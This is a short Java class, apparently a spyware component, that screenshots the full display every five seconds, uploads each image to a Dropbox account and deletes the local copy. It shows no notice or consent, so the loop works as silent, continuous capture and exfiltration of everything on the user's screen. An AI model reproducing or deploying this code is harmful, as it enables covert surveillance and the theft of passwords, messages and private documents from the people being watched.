import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import javax.imageio.ImageIO;
import com.dropbox.core.v2.DbxClientV2;

public class ScreenFoto extends Thread {
    private DbxClientV2 client;

    ScreenFoto(DbxClientV2 setClient) {
        client = setClient;
    }

    @Override
    public void run() {
        SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_HHmmss");
        File temp = null;
        try {
            while (true) {
                BufferedImage im = new Robot()
                        .createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                Date now = new Date();
                String dateNow = formatter.format(now);
                temp = File.createTempFile(dateNow, ".png");
                ImageIO.write(im, "png", temp);
                InputStream in = new FileInputStream(temp.getAbsolutePath());
                client.files().uploadBuilder("/" + dateNow + ".png").uploadAndFinish(in).toString();
                temp.delete();
                Thread.sleep(5000);
            }
        } catch (Exception ex) {
            if (temp != null)
                temp.delete();
            ex.printStackTrace();
        }
    }
}
